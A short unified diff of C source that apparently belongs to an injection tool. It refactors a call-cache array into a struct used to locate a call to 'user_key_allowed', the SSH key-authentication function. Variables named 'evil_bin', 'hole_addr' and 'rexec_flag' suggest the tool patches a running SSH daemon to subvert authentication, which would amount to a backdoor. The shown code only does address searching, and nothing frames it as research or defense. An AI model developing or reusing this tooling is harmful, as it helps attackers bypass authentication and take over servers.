@@ -37,7 +37,8 @@ signature signatures[]={
 u64 sub_by_debugstr(inject_ctx *ctx, char *str) {
 	char rdibuf[]="\x48\x8d\x3d\x00\x00\x00\x00";
 	int *rptr= (int*)&rdibuf[3];
-	u64 str_addr, lea_addr = 0, rdiff=0, rtop=0, *callcache;
+	u64 str_addr, lea_addr = 0, rdiff=0, rtop=0;
+	callcache_entry *callcache, *entry;
 	u32 callcache_total;
 	int i, j;
 	mem_mapping *mapping;
@@ -71,10 +72,11 @@ u64 sub_by_debugstr(inject_ctx *ctx, char *str) {
 	rtop=0;
 
 	for(i=0; i<callcache_total; i++) {
-		if (callcache[(i*2)+1] < lea_addr) {
-			if (lea_addr - callcache[(i*2)+1] < rdiff) {
-				rdiff = lea_addr - callcache[(i*2)+1];
-				rtop = callcache[(i*2)+1];
+		entry = &callcache[i];
+		if (entry->dest < lea_addr) {
+			if (lea_addr - entry->dest < rdiff) {
+				rdiff = lea_addr - entry->dest;
+				rtop = entry->dest;
 			}
 		}
 	}
@@ -88,7 +90,7 @@ int main(int argc, char *argv[]) {
 	int i, j;
 
 	u32 nullw=0, callcache_total;
-	u64 *callcache;
+	callcache_entry *callcache, *entry;
 	u64 diff=0, call_user_key_allowed2=0, hole_addr=0, rexec_flag;
 	u8 *evil_bin;
 
@@ -179,9 +181,10 @@ int main(int argc, char *argv[]) {
 	callcache_total = get_callcachetotal();
 
 	for(i=0; i<callcache_total; i++) {
-		if (callcache[(i*2)+1] == signatures[0].addr) {
-			info("found call user_key_allowed @ 0x%lx", callcache[(i*2)]);
-			call_user_key_allowed2 = callcache[(i*2)];
+		entry = &callcache[i];
+		if (entry->dest == signatures[0].addr) {
+			info("found call user_key_allowed @ 0x%lx", entry->addr);
+			call_user_key_allowed2 = entry->addr;
 		}
 	}
 
